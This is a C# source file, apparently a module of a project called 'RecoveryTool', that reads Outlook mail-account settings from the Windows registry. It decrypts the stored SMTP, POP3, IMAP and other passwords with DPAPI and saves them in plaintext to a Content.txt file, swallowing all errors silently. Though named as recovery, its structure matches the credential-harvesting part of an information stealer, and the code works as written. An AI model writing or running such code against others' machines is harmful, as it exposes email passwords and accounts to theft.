using RecoveryTool.Recovery.Utilities;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Text;

namespace RecoveryTool.Recovery.EmailClients
{
    public partial class OutlookService
    {
        private static readonly string[] RegDirectories = GetRegDirectories();

        private static string[] GetRegDirectories()
        {
            var directories = new List<string>();

            for (int version = 15; version <= 16; version++)
            {
                directories.Add($@"Software\Microsoft\Office\{version}.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676");
            }

            directories.Add(@"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676");
            directories.Add(@"Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676");

            return [.. directories];
        }

        private static readonly string[] MailClients = [
            "SMTP Email Address", "SMTP Server", "POP3 Server",
            "POP3 User Name", "SMTP User Name", "NNTP Email Address",
            "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name",
            "Email", "HTTP User", "HTTP Server URL", "POP3 User",
            "IMAP User", "HTTPMail User Name", "HTTPMail Server",
            "SMTP User", "POP3 Password2", "IMAP Password2",
            "NNTP Password2", "HTTPMail Password2", "SMTP Password2",
            "POP3 Password", "IMAP Password", "NNTP Password",
            "HTTPMail Password", "SMTP Password"
        ];

        public static async Task SaveOutlookAsync()
        {
            var data = string.Join(Environment.NewLine, RegDirectories.Select(dir => Get(dir, MailClients)));

            if (!string.IsNullOrWhiteSpace(data))
            {
                try
                {
                    string saveOutlookPath = Common.EnsureOutlookPath();
                    File.WriteAllText(Path.Combine(saveOutlookPath, "Content.txt"), data + Environment.NewLine);
                } catch { }
            }
        }

        private static string Get(string path, string[] clients)
        {
            var data = new StringBuilder();

            try
            {
                foreach (var client in clients)
                {
                    try
                    {
                        var value = GetInfoFromReg(path, client);
                        if (value != null)
                        {
                            data.AppendLine($"{client}: {FormatValue(client, value)}");
                        }
                    }
                    catch { }
                }

                using var key = Registry.CurrentUser.OpenSubKey(path, false);
                if (key != null)
                {
                    foreach (var subKey in key.GetSubKeyNames())
                    {
                        data.Append(Get($"{path}\\{subKey}", clients));
                    }
                }
            } catch { }

            return data.ToString();
        }

        private static string FormatValue(string client, object value)
        {
            if (value is byte[] byteValue)
            {
                if (client.Contains("Password") && !client.Contains('2'))
                {
                    return Decrypt(byteValue);
                }
                return Encoding.UTF8.GetString(byteValue).Replace("\0", "");
            }

            var stringValue = value.ToString();
            if (SmptClientRegex().IsMatch(stringValue) || MailClientRegex().IsMatch(stringValue))
            {
                return stringValue;
            }

            return "null";
        }

        private static object GetInfoFromReg(string path, string valueName)
        {
            try
            {
                using var registryKey = Registry.CurrentUser.OpenSubKey(path, false);
                return registryKey?.GetValue(valueName);
            }
            catch
            {
                return null;
            }
        }

        private static string Decrypt(byte[] encrypted)
        {
            try
            {
                var decoded = new byte[encrypted.Length - 1];
                Buffer.BlockCopy(encrypted, 1, decoded, 0, encrypted.Length - 1);

                var decrypted = ProtectedData.Unprotect(decoded, null, DataProtectionScope.CurrentUser);
                return Encoding.UTF8.GetString(decrypted).Replace("\0", "");
            }
            catch
            {
                return "null";
            }
        }

        [GeneratedRegex(@"^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$")]
        private static partial Regex SmptClientRegex();

        [GeneratedRegex(@"^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$")]
        private static partial Regex MailClientRegex();
    }
}